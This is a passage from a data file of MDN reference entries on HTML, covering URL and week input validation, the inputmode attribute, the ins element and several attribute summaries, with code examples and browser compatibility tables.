value=\"https://www.mozilla.org/\" label=\"Mozilla\"></option>\n  <option value=\"http://w3.org/\" label=\"W3C\"></option>\n</datalist>\n```\n\n## Validation\n\nThere are two levels of content validation available for `url` inputs. First, there's the standard level of validation offered to all [`<input>`](../input)s, which automatically ensures that the contents meet the requirements to be a valid URL. But there's also the option to add additional filtering to ensure that your own specialized needs are met, if you have any.\n\n**Warning:** HTML form validation is *not* a substitute for scripts that ensure that the entered data is in the proper format. It's far too easy for someone to make adjustments to the HTML that allow them to bypass the validation, or to remove it entirely. It's also possible for someone to bypass your HTML entirely and submit the data directly to your server. If your server-side code fails to validate the data it receives, disaster could strike when improperly-formatted data (or data which is too large, is of the wrong type, and so forth) is entered into your database.\n\n### Basic validation\n\nBrowsers that support the `url` input type automatically provide validation to ensure that only text that matches the standard format for URLs is entered into the input box.\n\nThe syntax of a URL is fairly intricate. It's defined by WHATWG's [URL Living Standard](https://url.spec.whatwg.org/) and is described for newcomers in our article [What is a URL?](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Web_mechanics/What_is_a_URL)\n\n### Making a URL required\n\nAs mentioned earlier, to make a URL entry required before the form can be submitted (you can't leave the field blank), you just need to include the [`required`](../input#required) attribute on the input.\n\nhtml\n\n```\n<form>\n  <input id=\"myURL\" name=\"myURL\" type=\"url\" required />\n  <button>Submit</button>\n</form>\n```\n\nTry submitting the above form with no value entered to see what happens.\n\n### Pattern validation\n\nIf you need the entered URL to be restricted further than just \"any string that looks like a URL,\" you can use the [`pattern`](../input#pattern) attribute to specify a [regular expression](https://developer.mozilla.org/en-US/docs/Glossary/Regular_expression) the value must match for the value to be valid.\n\nFor example, let's say you're building a support page for employees of Myco, Inc. which will let them contact their IT department for help if one of their pages has a problem. In our simplified form, the user needs to enter the URL of the page that has a problem, and a message describing what is wrong. But we want the URL to only successfully validate if the entered URL is in a Myco domain.\n\nSince inputs of type `url` validate against both the standard URL validation *and* the specified [`pattern`](../input#pattern), you can implement this with a regular expression. Let's see how:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"myURL\">Enter the problem website address:</label>\n    <input\n      id=\"myURL\"\n      name=\"myURL\"\n      type=\"url\"\n      required\n      pattern=\".*\\.myco\\..*\"\n      title=\"The URL must be in a Myco domain\" />\n    <span class=\"validity\"></span>\n  </div>\n  <div>\n    <label for=\"myComment\">What is the problem?</label>\n    <input id=\"myComment\" name=\"myComment\" type=\"text\" required />\n    <span class=\"validity\"></span>\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\nFirst of all, the [`required`](../input#required) attribute is specified, making it mandatory that a valid URL be provided.\n\nSecond, in the `url` input, we set `pattern` to `\".*\\.myco\\..*\"`. This regular expression requests a string that has any number of characters, followed by a dot, followed by \"myco\", followed by a dot, followed by any number of characters. Because the browser runs both the standard URL filter *and* our custom pattern against the specified text, we wind up with a validation that says \"make sure this is a valid URL, and also in a Myco domain.\"\n\nThis isn't perfect, but it is good enough for this basic demo's requirements.\n\nIt's advisable to use the [`title`](../../global_attributes#title) attribute along with `pattern`. If you do, the `title` *must* describe the pattern; it should explain what format the data should take on, rather than any other information. That's because the `title` may be displayed or spoken as part of a validation error message. For example, the browser might present the message \"The entered text doesn't match the required pattern.\" followed by your specified `title`. If your `title` is something like \"URL\", the result would be the message \"The entered text doesn't match the required pattern. URL\", which is not a good user experience.\n\nThat's why, instead, we specify the string \"The URL must be in a myco domain\". By doing that, the resulting full error message might be something like \"The entered text doesn't match the required pattern. The URL should be in a myco domain.\"\n\n**Note:** If you run into trouble while writing your validation regular expressions and they're not working properly, check your browser's console; there may be helpful error messages there to aid you in solving the problem.\n\n## Examples\n\nThere's not much else to say about `url` type inputs; check the [Pattern validation](#pattern_validation) and [Using URL inputs](#using_url_inputs) sections for numerous examples.\n\nYou can also find our [pattern validation example on GitHub](https://github.com/mdn/learning-area/blob/main/html/forms/url-example/index.html) (see it [running live also](https://mdn.github.io/learning-area/html/forms/url-example/)).\n\n## Technical summary\n\n|                                 |                                                                                                                                                                                                                                                                                                              |                                                                                                                          |\n|---------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string representing a URL, or empty                                                                                                                                                                                                                                                                        |                                                                                                                          |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)                                                                                                                                    |                                                                                                                          |\n| **Supported Common Attributes** | [`autocomplete`](../input#autocomplete), [`list`](../input#list), [`maxlength`](../input#maxlength), [`minlength`](../input#minlength), [`pattern`](../input#pattern), [`placeholder`](../input#placeholder), [`readonly`](../input#readonly), [`required`](../input#required) and [`size`](../input#size)   |                                                                                                                          |\n| **IDL attributes**              | `list`, `value`, `selectionEnd`, `selectionDirection`                                                                                                                                                                                                                                                        |                                                                                                                          |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                                                                                                                                                      |                                                                                                                          |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select), [`setRangeText()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setRangeText) and [`setSelectionRange()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setSelectionRange). |                                                                                                                          |\n| **Implicit ARIA Role**          | with no `list` attribute: [`textbox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/textbox_role)                                                                                                                                                                                    | with `list` attribute: [`combobox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/combobox_role) |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `url` | 1       | 12   | 1       | 11    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- [HTML forms guide](https://developer.mozilla.org/en-US/docs/Learn/Forms)\n- [`<input>`](../input)\n- [`<input type=\"tel\">`](tel)\n- [`<input type=\"email\">`](email)\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/url](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/url)"
- name: input type="week"
  summary: <input> elements of type week create input fields allowing easy entry of a year plus the ISO 8601 week number during that year (i.e., week 1 to 52 or 53)
  description: "# \\<input type=\"week\"\\>\n\n[`<input>`](../input) elements of type `week` create input fields allowing easy entry of a year plus the [ISO 8601 week number](https://en.wikipedia.org/wiki/ISO_8601#Week_dates) during that year (i.e., week 1 to [52 or 53](https://en.wikipedia.org/wiki/ISO_8601#Week_dates)).\n\n## Try it\n\n#### HTML Demo: \\<input type=\"week\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"camp-week\">Choose a week in May or June:</label>\n\n    <input type=\"week\" name=\"week\" id=\"camp-week\" min=\"2018-W18\" max=\"2018-W26\" required />\n\n    label {\n      display: block;\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input,\n    label {\n      margin: 0.4rem 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe control's user interface varies from browser to browser; cross-browser support is currently a bit limited, with only Chrome/Opera and Microsoft Edge supporting it at this time. In non-supporting browsers, the control degrades gracefully to function identically to [`<input type=\"text\">`](text).\n\n## Value\n\nA string representing the value of the week/year entered into the input. The format of the date and time value used by this input type is described in [Week strings](../../date_and_time_formats#week_strings).\n\nYou can set a default value for the input by including a value inside the [`value`](../input#value) attribute, like so:\n\nhtml\n\n```\n<label for=\"week\">What week would you like to start?</label>\n<input id=\"week\" type=\"week\" name=\"week\" value=\"2017-W01\" />\n```\n\nOne thing to note is that the displayed format may differ from the actual `value`, which is always formatted `yyyy-Www`. When the above value is submitted to the server, for example, browsers may display it as `Week 01, 2017`, but the submitted value will always look like `week=2017-W01`.\n\nYou can also get and set the value in JavaScript using the input element's `value` property, for example:\n\njs\n\n```\nconst weekControl = document.querySelector('input[type=\"week\"]');\nweekControl.value = \"2017-W45\";\n```\n\n## Additional attributes\n\nIn addition to the attributes common to [`<input>`](../input) elements, week inputs offer the following attributes.\n\n### max\n\nThe latest (time-wise) year and week number, in the string format discussed in the [Value](#value) section above, to accept. If the [`value`](../input#value) entered into the element exceeds this, the element fails [constraint validation](../../constraint_validation). If the value of the `max` attribute isn't a valid week string, then the element has no maximum value.\n\nThis value must be greater than or equal to the year and week specified by the `min` attribute.\n\n### min\n\nThe earliest year and week to accept. If the [`value`](../input#value) of the element is less than this, the element fails [constraint validation](../../constraint_validation). If a value is specified for `min` that isn't a valid week string, the input has no minimum value.\n\nThis value must be less than or equal to the value of the `max` attribute.\n\n### readonly\n\nA Boolean attribute which, if present, means this field cannot be edited by the user. Its `value` can, however, still be changed by JavaScript code directly setting the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) `value` property.\n\n**Note:** Because a read-only field cannot have a value, `required` does not have any effect on inputs with the `readonly` attribute also specified.\n\n### step\n\nThe `step` attribute is a number that specifies the granularity that the value must adhere to, or the special value `any`, which is described below. Only values which are equal to the basis for stepping ([`min`](#min) if specified, [`value`](../input#value) otherwise, and an appropriate default value if neither of those is provided) are valid.\n\nA string value of `any` means that no stepping is implied, and any value is allowed (barring other constraints, such as [`min`](#min) and [`max`](#max)).\n\n**Note:** When the data entered by the user doesn't adhere to the stepping configuration, the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) may round to the nearest valid value, preferring numbers in the positive direction when there are two equally close options.\n\nFor `week` inputs, the value of `step` is given in weeks, with a scaling factor of 604,800,000 (since the underlying numeric value is in milliseconds). The default value of `step` is 1, indicating 1week. The default stepping base is -259,200,000, which is the beginning of the first week of 1970 (`\"1970-W01\"`).\n\n*At this time, it's unclear what a value of `\"any\"` means for `step` when used with `week` inputs. This will be updated as soon as that information is determined.*\n\n## Using week inputs\n\nWeek inputs sound convenient at first glance, since they provide an easy UI for choosing weeks, and they normalize the data format sent to the server, regardless of the user's browser or locale. However, there are issues with `<input type=\"week\">` because browser support is not guaranteed across all browsers.\n\nWe'll look at basic and more complex uses of `<input type=\"week\">`, then offer advice on mitigating the browser support issue later on (see [Handling browser support](#handling_browser_support)).\n\n### Basic uses of week\n\nThe simplest use of `<input type=\"week\">` involves a basic `<input>` and [`<label>`](../label) element combination, as seen below:\n\nhtml\n\n```\n<form>\n  <label for=\"week\">What week would you like to start?</label>\n  <input id=\"week\" type=\"week\" name=\"week\" />\n</form>\n```\n\n### Controlling input size\n\n`<input type=\"week\">` doesn't support form sizing attributes such as [`size`](../input#size). You'll have to resort to [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) for sizing needs.\n\n### Using the step attribute\n\nYou should be able to use the [`step`](../input#step) attribute to vary the number of weeks jumped whenever they are incremented or decremented, however it doesn't seem to have any effect on supporting browsers.\n\n## Validation\n\nBy default, `<input type=\"week\">` does not apply any validation to entered values. The UI implementations generally don't let you specify anything that isn't a valid week/year, which is helpful, but it's still possible to submit with the field empty, and you might want to restrict the range of choosable weeks.\n\n### Setting maximum and minimum weeks\n\nYou can use the [`min`](../input#min) and [`max`](../input#max) attributes to restrict the valid weeks that can be chosen by the user. In the following example we are setting a minimum value of `Week 01, 2017` and a maximum value of `Week 52, 2017`:\n\nhtml\n\n```\n<form>\n  <label for=\"week\">What week would you like to start?</label>\n  <input id=\"week\" type=\"week\" name=\"week\" min=\"2017-W01\" max=\"2017-W52\" />\n  <span class=\"validity\"></span>\n</form>\n```\n\nHere's the CSS used in the above example. Here we make use of the [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) and [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) CSS properties to style the input based on whether the current value is valid. We had to put the icons on a [`<span>`](../span) next to the input, not on the input itself, because in Chrome the generated content is placed inside the form control, and can't be styled or shown effectively.\n\ncss\n\n```\ndiv {\n  margin-bottom: 10px;\n  position: relative;\n}\n\ninput[type=\"number\"] {\n  width: 100px;\n}\n\ninput + span {\n  padding-right: 30px;\n}\n\ninput:invalid + span::after {\n  position: absolute;\n  content: \"✖\";\n  padding-left: 5px;\n}\n\ninput:valid + span::after {\n  position: absolute;\n  content: \"✓\";\n  padding-left: 5px;\n}\n```\n\nThe result here is that only weeks between W01 and W52 in 2017 will be seen as valid and be selectable in supporting browsers.\n\n### Making week values required\n\nIn addition you can use the [`required`](../input#required) attribute to make filling in the week mandatory. As a result, supporting browsers will display an error if you try to submit an empty week field.\n\nLet's look at an example; here we've set minimum and maximum weeks, and also made the field required:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"week\">What week would you like to start?</label>\n    <input\n      id=\"week\"\n      type=\"week\"\n      name=\"week\"\n      min=\"2017-W01\"\n      max=\"2017-W52\"\n      required />\n    <span class=\"validity\"></span>\n  </div>\n  <div>\n    <input type=\"submit\" value=\"Submit form\" />\n  </div>\n</form>\n```\n\nIf you try to submit the form with no value, the browser displays an error. Try playing with the example now:\n\nHere is a screenshot for those of you who aren't using a supporting browser:\n\n**Warning:** HTML form validation is *not* a substitute for scripts that ensure that the entered data is in the proper format. It's far too easy for someone to make adjustments to the HTML that allow them to bypass the validation, or to remove it entirely. It's also possible for someone to bypass your HTML entirely and submit the data directly to your server. If your server-side code fails to validate the data it receives, disaster could strike when improperly-formatted data is submitted (or data which is too large, of the wrong type, and so forth).\n\n## Handling browser support\n\nAs mentioned above, the major problem with using week inputs right now is browser support: Safari and Firefox don't support it on desktop, and old versions of IE don't support it.\n\nMobile platforms such as Android and iOS make perfect use of such input types, providing specialist UI controls that make it really easy to select values in a touchscreen environment. For example, the `week` picker on Chrome for Android looks like this:\n\nNon-supporting browsers gracefully degrade to a text input, but this creates problems both in terms of consistency of user interface (the presented control will be different), and data handling.\n\nThe second problem is the more serious. As mentioned earlier, with a `week` input the actual value is always normalized to the format `yyyy-Www`. When the browser falls back to a generic text input, there's nothing to guide the user toward correctly formatting the input (and it's certainly not intuitive). There are multiple ways in which people could write week values; for example:\n\n- `Week 1 2017`\n- `Jan 2-8 2017`\n- `2017-W01`\n- etc.\n\nThe best way to deal with week/years in forms in a cross-browser way at the moment is to get the user to enter the week number and year in separate controls ([`<select>`](../select) elements being popular; see below for an example), or use JavaScript libraries such as [jQuery date picker](https://jqueryui.com/datepicker/).\n\n## Examples\n\nIn this example we create two sets of UI elements for choosing weeks: a native picker created using `<input type=\"week\">`, and a set of two [`<select>`](../select) elements for choosing weeks/years in older browsers that don't support the `week` input type.\n\nThe HTML looks like so:\n\nhtml\n\n```\n<form>\n  <div class=\"nativeWeekPicker\">\n    <label for=\"week\">What week would you like to start?</label>\n    <input\n      id=\"week\"\n      type=\"week\"\n      name=\"week\"\n      min=\"2017-W01\"\n      max=\"2018-W52\"\n      required />\n    <span class=\"validity\"></span>\n  </div>\n  <p class=\"fallbackLabel\">What week would you like to start?</p>\n  <div class=\"fallbackWeekPicker\">\n    <div>\n      <span>\n        <label for=\"week\">Week:</label>\n        <select id=\"fallbackWeek\" name=\"week\"></select>\n      </span>\n      <span>\n        <label for=\"year\">Year:</label>\n        <select id=\"year\" name=\"year\">\n          <option value=\"2017\" selected>2017</option>\n          <option value=\"2018\">2018</option>\n        </select>\n      </span>\n    </div>\n  </div>\n</form>\n```\n\nThe week values are dynamically generated by the JavaScript code below.\n\nThe other part of the code that may be of interest is the feature detection code. To detect whether the browser supports `<input type=\"week\">`, we create a new [`<input>`](../input) element, try setting its `type` to `week`, then immediately check what its `type` is set to. Non-supporting browsers will return `text`, because the `week` type falls back to type `text`. If `<input type=\"week\">` is not supported, we hide the native picker and show the fallback picker UI ([`<select>`](../select)s) instead.\n\njs\n\n```\n// Get UI elements\nconst nativePicker = document.querySelector(\".nativeWeekPicker\");\nconst fallbackPicker = document.querySelector(\".fallbackWeekPicker\");\nconst fallbackLabel = document.querySelector(\".fallbackLabel\");\n\nconst yearSelect = document.querySelector(\"#year\");\nconst weekSelect = document.querySelector(\"#fallbackWeek\");\n\n// Hide fallback initially\nfallbackPicker.style.display = \"none\";\nfallbackLabel.style.display = \"none\";\n\n// Test whether a new date input falls back to a text input or not\nconst test = document.createElement(\"input\");\n\ntry {\n  test.type = \"week\";\n} catch (e) {\n  console.log(e.description);\n}\n\n// If it does, run the code inside the if () {} block\nif (test.type === \"text\") {\n  // Hide the native picker and show the fallback\n  nativePicker.style.display = \"none\";\n  fallbackPicker.style.display = \"block\";\n  fallbackLabel.style.display = \"block\";\n\n  // populate the weeks dynamically\n  populateWeeks();\n}\n\nfunction populateWeeks() {\n  // Populate the week select with 52 weeks\n  for (let i = 1; i <= 52; i++) {\n    const option = document.createElement(\"option\");\n    option.textContent = i < 10 ? `0${i}` : i;\n    weekSelect.appendChild(option);\n  }\n}\n```\n\n**Note:** Remember that some years have 53 weeks in them (see [Weeks per year](https://en.wikipedia.org/wiki/ISO_week_date#Weeks_per_year))! You'll need to take this into consideration when developing production apps.\n\n## Technical summary\n\n|                                 |                                                                                                                                                                                                                                                                                |\n|---------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string representing a week and year, or empty                                                                                                                                                                                                                                |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)                                                                                                      |\n| **Supported common attributes** | [`autocomplete`](../input#autocomplete), [`list`](../input#list), [`readonly`](../input#readonly), [`step`](../input#step)                                                                                                                                                     |\n| **IDL attributes**              | [`list`](../input#list), [`value`](../input#value), `valueAsDate`, `valueAsNumber`                                                                                                                                                                                             |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                                                                                                                        |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select), [`stepDown()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepDown), and [`stepUp()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepUp) |\n| **Implicit ARIA Role**          | [no corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                                            |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `week` | 20      | 12   | No      | 11    | No     | 25             | 18                  | 14            | No            | 1.5              | 4.4             |     |\n\n## See also\n\n- The generic [`<input>`](../input) element and the interface used to manipulate it, [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)\n- [Date and time formats used in HTML](../../date_and_time_formats)\n- [`<input type=\"datetime-local\">`](datetime-local), [`<input type=\"date\">`](date), [`<input type=\"time\">`](time), and [`<input type=\"month\">`](month)\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/week](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/week)"
- name: inputmode (attribute)
  summary: The inputmode global attribute is an enumerated attribute that hints at the type of data that might be entered by the user while editing the element or its contents
  description: "# inputmode\n\nThe `inputmode` [global attribute](../global_attributes) is an [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute that hints at the type of data that might be entered by the user while editing the element or its contents. This allows a browser to display an appropriate virtual keyboard.\n\nIt is used primarily on [`<input>`](../element/input) elements, but is usable on any element in [`contenteditable`](../global_attributes#contenteditable) mode.\n\nIt's important to understand that the `inputmode` attribute doesn't cause any validity requirements to be enforced on input. To require that input conforms to a particular data type, choose an appropriate [`<input>`](../element/input#input_types) element type. For specific guidance on choosing [`<input>`](../element/input) types, see the [Values](#values) section.\n\n## Values\n\nThe attribute can have any of the following values:\n\n[`none`](#none)  \nNo virtual keyboard. For when the page implements its own keyboard input control.\n\n[`text`](#text) (default value)  \nStandard input keyboard for the user's current locale.\n\n[`decimal`](#decimal)  \nFractional numeric input keyboard containing the digits and decimal separator for the user's locale (typically . or ,). Devices may or may not show a minus key (-).\n\n[`numeric`](#numeric)  \nNumeric input keyboard, but only requires the digits 0–9. Devices may or may not show a minus key.\n\n[`tel`](#tel)  \nA telephone keypad input, including the digits 0–9, the asterisk (\\*), and the pound (\\#) key. Inputs that *require* a telephone number should typically use [`<input type=\"tel\">`](../element/input/tel) instead.\n\n[`search`](#search)  \nA virtual keyboard optimized for search input. For instance, the [return/submit key](https://html.spec.whatwg.org/multipage/interaction.html#input-modalities:-the-enterkeyhint-attribute) may be labeled \"Search\", along with possible other optimizations. Inputs that *require* a search query should typically use [`<input type=\"search\">`](../element/input/search) instead.\n\n[`email`](#email)  \nA virtual keyboard optimized for entering email addresses. Typically includes the @character as well as other optimizations. Inputs that *require* email addresses should typically use [`<input type=\"email\">`](../element/input/email) instead.\n\n[`url`](#url)  \nA keypad optimized for entering URLs. This may have the / key more prominent, for example. Enhanced features could include history access and so on. Inputs that *require* a URL should typically use [`<input type=\"url\">`](../element/input/url) instead.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- All [global attributes](../global_attributes).\n- [`enterkeyhint`](enterkeyhint) global attribute\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/inputmode](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/inputmode)"
- name: inputmode (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`inputmode`](global_attributes/inputmode)

    [`<textarea>`](element/textarea), [`contenteditable`](global_attributes/contenteditable)

    Provides a hint as to the type of data that might be entered by the user while editing the element or its contents. The attribute can be used with form controls (such as the value of `textarea` elements), or in elements in an editing host (e.g., using `contenteditable` attribute).
- name: ins
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<ins\\>: The Inserted Text element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fins&level=high)\n\nThe `<ins>` [HTML](../index) element represents a range of text that has been added to a document. You can use the [`<del>`](del) element to similarly represent a range of text that has been deleted from the document.\n\n## Try it\n\n#### HTML Demo: \\<ins\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>“You're late!”</p>\n    <del>\n      <p>“I apologize for the delay.”</p>\n    </del>\n    <ins cite=\"../howtobeawizard.html\" datetime=\"2018-05\">\n      <p>“A wizard is never late …”</p>\n    </ins>\n\n    del,\n    ins {\n      display: block;\n      text-decoration: none;\n      position: relative;\n    }\n\n    del {\n      background-color: #fbb;\n    }\n\n    ins {\n      background-color: #d4fcbc;\n    }\n\n    del::before,\n    ins::before {\n      position: absolute;\n      left: 0.5rem;\n      font-family: monospace;\n    }\n\n    del::before {\n      content: '−';\n    }\n\n    ins::before {\n      content: '+';\n    }\n\n    p {\n      margin: 0 1.8rem 0;\n      font-family: Georgia, serif;\n      font-size: 1rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`cite`](#cite)  \nThis attribute defines the URI of a resource that explains the change, such as a link to meeting minutes or a ticket in a troubleshooting system.\n\n[`datetime`](#datetime)  \nThis attribute indicates the time and date of the change and must be a valid date with an optional time string. If the value cannot be parsed as a date with an optional time string, the element does not have an associated timestamp. For the format of the string without a time, see [Format of a valid date string](../date_and_time_formats#date_strings). The format of the string if it includes both date and time is covered in [Format of a valid local date and time string](../date_and_time_formats#local_date_and_time_strings).\n\n## Accessibility\n\nThe presence of the `<ins>` element is not announced by most screen reading technology in its default configuration. It can be made to be announced by using the CSS [`content`](https://developer.mozilla.org/en-US/docs/Web/CSS/content) property, along with the [`::before`](https://developer.mozilla.org/en-US/docs/Web/CSS/::before) and [`::after`](https://developer.mozilla.org/en-US/docs/Web/CSS/::after) pseudo-elements.\n\ncss\n\n```\nins::before,\nins::after {\n  clip-path: inset(100%);\n  clip: rect(1px, 1px, 1px, 1px);\n  height: 1px;\n  overflow: hidden;\n  position: absolute;\n  white-space: nowrap;\n  width: 1px;\n}\n\nins::before {\n  content: \" [insertion start] \";\n}\n\nins::after {\n  content: \" [insertion end] \";\n}\n```\n\nSome people who use screen readers deliberately disable announcing content that creates extra verbosity. Because of this, it is important to not abuse this technique and only apply it in situations where not knowing content has been inserted would adversely affect understanding.\n\n- [Short note on making your mark (more accessible) \\| The Paciello Group](https://www.tpgi.com/short-note-on-making-your-mark-more-accessible/)\n- [Tweaking Text Level Styles \\| Adrian Roselli](https://adrianroselli.com/2017/12/tweaking-text-level-styles.html)\n\n## Examples\n\nhtml\n\n```\n<ins>This text has been inserted</ins>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                              |\n|---------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Phrasing content](../content_categories#phrasing_content), [flow content](../content_categories#flow_content).                              |\n| Permitted content                           | [Transparent](../content_categories#transparent_content_model).                                                                              |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                        |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                         |\n| Implicit ARIA role                          | [`insertion`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/structural_roles#structural_roles_with_html_equivalents) |\n| Permitted ARIA roles                        | Any                                                                                                                                          |\n| DOM interface                               | [`HTMLModElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLModElement)                                                          |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `ins`      | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `cite`     | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `datetime` | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<del>`](del) element for marking deletion into a document\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/ins](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/ins)"
- name: integrity (attribute)
  summary: Specifies a Subresource Integrity value that allows browsers to verify what they fetch
  belongs_to: Attributes
  description: |-
    [`integrity`](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)

    [`<link>`](element/link), [`<script>`](element/script)

    Specifies a [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity) value that allows browsers to verify what they fetch.
- name: intrinsicsize (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`intrinsicsize`](element/img#intrinsicsize) Deprecated

    [`<img>`](element/img)

    This attribute tells the browser to ignore the actual intrinsic size of the image and pretend it's the size specified in the attribute.
- name: is (attribute)
  summary: This feature is not Baseline because it does not work in some of the most widely-used browsers
